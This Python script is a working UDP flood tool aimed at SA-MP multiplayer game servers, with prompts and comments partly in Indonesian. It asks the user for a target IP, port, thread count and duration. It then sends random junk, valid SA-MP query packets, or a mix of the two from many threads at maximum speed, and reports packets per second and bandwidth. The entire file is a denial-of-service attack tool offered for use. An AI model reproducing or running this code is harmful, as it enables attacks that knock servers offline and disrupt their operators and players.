import socket
import threading
import random
import time

total_sent = 0
total_bytes = 0
total_responded = 0
total_no_response = 0
total_lock = threading.Lock()
stop_flag = threading.Event()

def generate_samp_packet(ip, port, mode):
    if mode == "1":
        return random.randbytes(random.randint(16, 32))
    elif mode == "2":
        ip_bytes = bytes([int(x) for x in ip.split('.')])
        port_bytes = port.to_bytes(2, byteorder='little')
        query_type = random.choice([b'i', b'r', b'd', b'c'])
        return b"SAMP" + ip_bytes + port_bytes + query_type
    elif mode == "3":
        if random.random() < 0.8:
            # 70% valid SA-MP query
            ip_bytes = bytes([int(x) for x in ip.split('.')])
            port_bytes = port.to_bytes(2, byteorder='little')
            query_type = random.choice([b'i', b'r', b'd', b'c'])
            return b"SAMP" + ip_bytes + port_bytes + query_type
        else:
            # 30% raw bytes
            return random.randbytes(random.randint(10024, 10024))
    else:
        return b'INVALID'

def flood_worker(ip, port, mode):
    global total_sent, total_bytes, total_responded, total_no_response
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)

    while not stop_flag.is_set():
        for _ in range(100):  # Kirim 5 paket per loop untuk meningkatkan speed
            try:
                packet = generate_samp_packet(ip, port, mode)
                sock.sendto(packet, (ip, port))
                with total_lock:
                    total_sent += 1
                    total_bytes += len(packet)
            except:
                continue

        try:
            data, addr = sock.recvfrom(4096)
            with total_lock:
                total_responded += 1
        except socket.timeout:
            with total_lock:
                total_no_response += 1

    sock.close()

def format_bandwidth(bytes_per_sec):
    kb = bytes_per_sec / 1024
    mb = kb / 1024
    gb = mb / 1024
    tb = gb / 1024
    if tb >= 1:
        return f"{tb:.2f} TB/s"
    elif gb >= 1:
        return f"{gb:.2f} GB/s"
    elif mb >= 1:
        return f"{mb:.2f} MB/s"
    elif kb >= 1:
        return f"{kb:.2f} KB/s"
    else:
        return f"{bytes_per_sec:.2f} B/s"

def pps_monitor():
    last_sent = 0
    last_bytes = 0
    while not stop_flag.is_set():
        time.sleep(1)
        with total_lock:
            current_sent = total_sent
            current_bytes = total_bytes
        pps = current_sent - last_sent
        bandwidth = current_bytes - last_bytes
        print(f"[PPS] Packets/s: {pps} | Bandwidth: {format_bandwidth(bandwidth)}")
        last_sent = current_sent
        last_bytes = current_bytes

def format_total_bytes(bytes_total):
    kb = bytes_total / 1024
    mb = kb / 1024
    gb = mb / 1024
    if gb >= 1:
        return f"{gb:.2f} GB"
    elif mb >= 1:
        return f"{mb:.2f} MB"
    else:
        return f"{kb:.2f} KB"

def main():
    print("=== SA-MP Flooder CLI - Hybrid Mode ===")
    ip = input("Target IP: ")
    port = int(input("Target Port: "))
    threads = int(input("Threads: "))
    duration = int(input("Flood Duration (in seconds): "))

    print("\nMode:")
    print("1 = Kirim data bebas (raw)")
    print("2 = Kirim query valid SA-MP (info/rules/clients/details)")
    print("3 = Hybrid (gabungan raw + query SA-MP)")
    mode = input("Pilih Mode (1/2/3): ").strip()

    print(f"\nMulai flooding ke {ip}:{port} selama {duration}s dengan {threads} threads.")
    print(f"Mode: {mode} | Delay: NONE (max speed)\n")

    monitor = threading.Thread(target=pps_monitor)
    monitor.start()

    worker_threads = []
    for _ in range(threads):
        t = threading.Thread(target=flood_worker, args=(ip, port, mode))
        t.start()
        worker_threads.append(t)

    time.sleep(duration)
    stop_flag.set()

    for t in worker_threads:
        t.join()
    monitor.join()

    print("\nFlood selesai.")
    print(f"Total paket terkirim     : {total_sent}")
    print(f"Total bandwidth          : {format_total_bytes(total_bytes)}")
    print(f"Total respon diterima    : {total_responded}")
    print(f"Total tanpa respon       : {total_no_response}")

if __name__ == "__main__":
    main()
      
